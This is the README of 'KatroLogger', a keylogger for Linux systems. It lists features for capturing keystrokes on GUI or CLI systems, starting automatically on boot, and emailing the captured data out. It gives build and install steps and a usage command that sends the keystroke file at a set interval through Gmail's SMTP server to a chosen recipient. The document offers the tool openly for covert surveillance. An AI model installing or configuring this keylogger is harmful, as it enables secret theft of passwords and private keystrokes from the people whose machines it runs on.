# KatroLogger
KeyLogger for Linux Systems.

- **Features**
  - Runs on GUI systems or CLI
  - Sending data by email
  - Autorun on boot

- **Dependencies**
- [libquickmail](https://sourceforge.net/projects/libquickmail/)
```
wget https://ufpr.dl.sourceforge.net/project/libquickmail/libquickmail-0.1.29.tar.xz
tar -xvf libquickmail-0.1.29.tar.xz
./autogen.sh && ./configure && make && make install
```

- **Compiling**
```Shell
./configure
make
make install
```
- **Usage**
```Shell
katrologger --output /path/file
```
- Send data by e-mail
```Shell
katrologger --smtps-url smtp.gmail.com --port 465 --mail-from <address> --mail-rcpt <address> --pass <password> --smtp-file /path/keyscan --time 10
```

- **Uninstall**
```Shell
make uninstall
```
